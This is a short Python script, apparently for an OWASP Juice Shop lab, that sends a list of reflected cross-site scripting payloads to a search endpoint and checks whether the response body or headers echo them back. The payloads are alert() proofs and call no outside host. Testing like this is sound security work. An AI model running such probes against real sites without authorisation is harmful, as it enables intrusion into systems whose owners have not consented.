import requests

# Target URL (Juice Shop search endpoint or any input field)
url = "http://192.168.1.51/rest/products/search"

# List of XSS payloads to test
xss_payloads = [
    "<script>alert('XSS Attack!');</script>",  # Basic XSS
    "<img src=x onerror=alert('XSS')>",        # Image-based XSS
    "'\"><svg/onload=alert('XSS')>",           # SVG-based XSS
    "<body onload=alert('XSS')>",              # Body-based XSS
    "<iframe src=javascript:alert('XSS')>",    # Iframe-based XSS
    "<a href='javascript:alert(\"XSS\")'>Click Me</a>",  # Link-based XSS
]

# Function to test XSS
def test_xss(url, payload):
    print(f"Testing payload: {payload}")
    
    # Send the payload in the query parameter
    params = {"q": payload}
    response = requests.get(url, params=params)
    
    # Check if the payload is reflected in the response body
    if payload in response.text:
        print(f"XSS Vulnerability Detected in Response Body! Payload: {payload}")
        return True
    
    # Check if the payload is reflected in the response headers
    for header, value in response.headers.items():
        if payload in value:
            print(f"XSS Vulnerability Detected in Response Header! Payload: {payload}")
            return True
    
    print(f"No XSS Vulnerability Found for Payload: {payload}")
    return False

# Test all payloads
for payload in xss_payloads:
    if test_xss(url, payload):
        break  # Stop testing if a vulnerability is found